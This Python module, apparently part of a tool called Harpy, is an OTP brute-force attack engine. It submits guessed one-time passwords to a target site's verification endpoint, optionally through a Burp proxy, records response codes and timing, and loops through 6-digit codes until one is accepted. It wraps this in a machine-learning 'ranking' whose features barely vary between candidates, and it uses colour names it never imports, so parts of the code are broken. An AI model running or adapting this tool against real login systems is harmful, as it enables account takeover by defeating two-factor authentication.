import requests
import random
import time
import json
import statistics
import numpy as np
from sklearn.ensemble import RandomForestClassifier
from sklearn.preprocessing import LabelEncoder
import matplotlib.pyplot as plt
import logging
from typing import List, Dict, Any, Optional

# Configure logging for the module
logging.basicConfig(level=logging.INFO, format='[🤖 HARPY-AI] %(levelname)s: %(message)s')
logger = logging.getLogger(__name__)

class HarpyAIOTP:
    """ 
    HarpyAIOTP is the core AI engine for OTP exploitation.
    It handles sending OTP verification requests, collecting response data,
    training a machine learning model to predict OTP success likelihood,
    and executing AI-driven or adaptive brute-force attacks.
    """
    def __init__(
        self,
        base_url: str,
        user_id: str,
        otp_verify_path: str,
        session: Optional[requests.Session] = None,
        burp_proxy: Optional[str] = None,
        debug: bool = True,
        proxy_monitor: Optional[Any] = None # Using Any to avoid circular dependency for now
    ):
        """
        Initializes the HarpyAIOTP engine.

        Args:
            base_url (str): The base URL of the target application (e.g., "https://example.com").
            user_id (str): The user identifier for the OTP (e.g., username, email).
            otp_verify_path (str): The path to the OTP verification endpoint (e.g., "/auth/verify-otp").
            session (Optional[requests.Session]): An optional pre-existing requests session.
                                                  If None, a new session is created.
            burp_proxy (Optional[str]): URL of the proxy (e.g., "http://127.0.0.1:8080").
            debug (bool): If True, enables verbose logging.
            proxy_monitor (Optional[Any]): An optional ProxyMonitor instance to check proxy status dynamically.
        """
        self.base_url = base_url.rstrip("/")
        self.user_id = user_id
        self.otp_verify_path = otp_verify_path
        self.session = session or requests.Session()
        self.debug = debug
        self.history: List[Dict[str, Any]] = []
        self.state_file = f"ai_otp_state_{user_id}.json"
        self.proxy_monitor = proxy_monitor

        self.proxies: Optional[Dict[str, str]] = {"http": burp_proxy, "https": burp_proxy} if burp_proxy else None

        self.encoder = LabelEncoder()
        self.classifier = RandomForestClassifier(n_estimators=100, random_state=42) # Added random_state for reproducibility

        if not self.debug:
            logger.setLevel(logging.WARNING) # Suppress INFO messages if debug is False

    def _log(self, level: int, msg: str):
        """Internal logging helper."""
        if self.debug:
            logger.log(level, msg)

    def verify(self, otp: str) -> Dict[str, Any]:
        """ 
        Submits an OTP for verification and records the response details.
        Dynamically switches to direct connection if proxy monitor indicates proxy is down.

        Args:
            otp (str): The One-Time Password to verify.

        Returns:
            Dict[str, Any]: A dictionary containing OTP, status code, response text, and elapsed time.
        """
        url = f"{self.base_url}{self.otp_verify_path}"
        payload = {"user_id": self.user_id, "otp": otp}
        start_time = time.time()

        current_proxies = self.proxies
        if self.proxy_monitor and not self.proxy_monitor.alive:
            current_proxies = None
            self._log(logging.INFO, "Proxy detected as down, using direct connection.")

        try:
            r = self.session.post(url, json=payload, proxies=current_proxies, timeout=10) # Added timeout
            elapsed_time = time.time() - start_time

            record = {
                "otp": otp,
                "status": r.status_code,
                "text": r.text.strip().lower(),
                "time": elapsed_time
            }
            self.history.append(record)

            self._log(logging.INFO, f"[{otp}] -> {r.status_code} | {elapsed_time:.3f}s | {r.text[:50]}")
            return record
        except requests.exceptions.ProxyError as e:
            logger.error(f"Proxy error during request for OTP {otp}: {e}")
            return {"otp": otp, "status": 999, "text": "proxy_error", "time": 0}
        except requests.exceptions.ConnectionError as e:
            logger.error(f"Connection error during request for OTP {otp}: {e}")
            return {"otp": otp, "status": 998, "text": "connection_error", "time": 0}
        except requests.exceptions.Timeout as e:
            logger.error(f"Timeout error during request for OTP {otp}: {e}")
            return {"otp": otp, "status": 997, "text": "timeout_error", "time": 0}
        except requests.exceptions.RequestException as e:
            logger.error(f"An unexpected request error occurred for OTP {otp}: {e}")
            return {"otp": otp, "status": 996, "text": "request_error", "time": 0}

    def train_model(self):
        """ 
        Trains the Random Forest Classifier model using collected OTP verification history.
        The model learns to predict success likelihood based on OTP length, first digit, status code, and response time.
        """
        if not self.history:
            self._log(logging.WARNING, "No data to train on. History is empty.")
            return

        X, y = [], []
        for rec in self.history:
            # Ensure OTP is a string and has at least one digit for int conversion
            first_digit = int(rec["otp"][0]) if rec["otp"] and rec["otp"][0].isdigit() else 0
            features = [
                len(rec["otp"]),
                first_digit,
                rec["status"],
                rec["time"]
            ]
            X.append(features)
            y.append("success" if "success" in rec["text"] or rec["status"] == 200 else "fail")

        try:
            y_encoded = self.encoder.fit_transform(y)
            self.classifier.fit(X, y_encoded)
            self._log(logging.INFO, "Model trained successfully on collected data.")
        except ValueError as e:
            logger.error(f"Error training model: {e}. This might happen if 'success' or 'fail' labels are missing.")
        except Exception as e:
            logger.error(f"An unexpected error occurred during model training: {e}")

    def predict_likelihood(self, otp: str) -> float:
        """ 
        Predicts the success probability for a given OTP using the trained ML model.

        Args:
            otp (str): The OTP string to predict.

        Returns:
            float: The predicted probability of success (between 0 and 1).
        """
        # Features for prediction should match training features
        first_digit = int(otp[0]) if otp and otp[0].isdigit() else 0
        features = [
            len(otp),
            first_digit,
            200,  # Assume a successful status code for prediction baseline
            0.1   # Assume a typical response time for prediction baseline
        ]
        try:
            proba = self.classifier.predict_proba([features])[0]
            # Ensure 'success' label exists in encoder classes
            if "success" in self.encoder.classes_:
                success_idx = self.encoder.transform(["success"])[0]
                return proba[success_idx]
            else:
                self._log(logging.WARNING, "'success' label not found in encoder classes. Returning 0.0.")
                return 0.0
        except Exception as e:
            logger.error(f"Error predicting likelihood for OTP {otp}: {e}. Returning 0.0.")
            return 0.0

    def ai_attack(self, max_attempts: int = 5000, digits: int = 6):
        """ 
        Executes an AI-driven attack by ranking OTP guesses based on predicted likelihood.

        Args:
            max_attempts (int): Maximum number of OTPs to attempt.
            digits (int): Number of digits in the OTP.
        """
        if not hasattr(self.classifier, 'predict_proba'):
            logger.error("AI model not trained. Please run fingerprinting/training first.")
            return

        logger.info(f"Generating {10**digits} OTP candidates for AI ranking...")
        candidates = [f"{i:0{digits}d}" for i in range(10**digits)]
        
        logger.info("Ranking candidates by predicted likelihood...")
        # Filter out candidates that might cause prediction errors (e.g., non-digit first char if that's a feature)
        # For now, assuming all generated candidates are valid for feature extraction.
        ranked = sorted(candidates, key=lambda otp: self.predict_likelihood(otp), reverse=True)

        attempts = 0
        logger.info(f"Launching AI-driven attack (max {max_attempts} attempts)...")
        for otp in ranked:
            rec = self.verify(otp)
            attempts += 1
            if "success" in rec["text"] or rec["status"] == 200:
                logger.info(Fore.GREEN + f"🚀 OTP CRACKED BY AI: {otp}" + Style.RESET_ALL)
                break
            if attempts >= max_attempts:
                logger.info(f"AI attack reached max attempts ({max_attempts}).")
                break

    def adaptive_attack(self, max_attempts: int = 2000, digits: int = 6):
        """ 
        Executes a simple adaptive brute-force attack by iterating through OTPs sequentially.

        Args:
            max_attempts (int): Maximum number of OTPs to attempt.
            digits (int): Number of digits in the OTP.
        """
        logger.info(f"Launching adaptive brute-force attack (max {max_attempts} attempts)...")
        for i in range(max_attempts):
            otp = f"{i:0{digits}d}"
            rec = self.verify(otp)
            if "success" in rec["text"] or rec["status"] == 200:
                logger.info(Fore.GREEN + f"🚀 OTP FOUND: {otp}" + Style.RESET_ALL)
                break

    def visualize(self):
        """ 
        Plots timing side-channel data collected during OTP verification attempts.
        Requires matplotlib to be installed.
        """
        if not self.history:
            logger.warning("No history data to visualize.")
            return

        times = [h["time"] for h in self.history]
        statuses = [h["status"] for h in self.history]

        try:
            plt.figure(figsize=(10,6))
            plt.scatter(range(len(times)), times, c=statuses, cmap="cool", marker="o")
            plt.title("AI OTP Timing & Response Classification")
            plt.xlabel("Attempt #")
            plt.ylabel("Response Time (s)")
            plt.grid(True)
            plt.show()
            logger.info("Timing analysis visualization displayed.")
        except Exception as e:
            logger.error(f"Error generating visualization: {e}. Ensure matplotlib is installed and display is available.")

    def save_state(self):
        """Saves the collected OTP verification history to a JSON file for persistence."""
        try:
            with open(self.state_file, "w") as f:
                json.dump(self.history, f, indent=4)
            logger.info(f"State saved to {self.state_file}.")
        except Exception as e:
            logger.error(f"Error saving state to {self.state_file}: {e}")

    def load_state(self):
        """Loads OTP verification history from a JSON file."""
        try:
            with open(self.state_file, "r") as f:
                self.history = json.load(f)
            logger.info(f"State loaded from {self.state_file}.")
        except FileNotFoundError:
            logger.warning(f"No saved state found at {self.state_file}.")
        except json.JSONDecodeError as e:
            logger.error(f"Error decoding JSON from {self.state_file}: {e}. File might be corrupted.")
        except Exception as e:
            logger.error(f"An unexpected error occurred loading state from {self.state_file}: {e}")
